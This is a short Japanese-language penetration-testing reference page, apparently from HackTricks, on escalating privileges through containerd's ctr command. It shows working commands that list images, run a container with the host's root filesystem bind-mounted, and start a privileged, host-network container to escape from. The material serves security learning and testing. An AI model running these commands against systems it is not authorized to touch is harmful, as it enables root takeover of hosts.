# Containerd (ctr) 特権昇格

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

**containerd** と `ctr` について学ぶには、以下のリンクにアクセスしてください：

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

ホストに `ctr` コマンドが含まれていることがわかった場合：
```bash
which ctr
/usr/bin/ctr
```
画像をリストできます:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
そして**ホストのルートフォルダーをマウントしてその画像の1つを実行します**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

特権コンテナを実行し、そこから脱出します。\
特権コンテナは次のように実行できます:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
次に、**特権機能を悪用してそれから脱出する**ために、以下のページに記載されているいくつかの技術を使用できます：

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
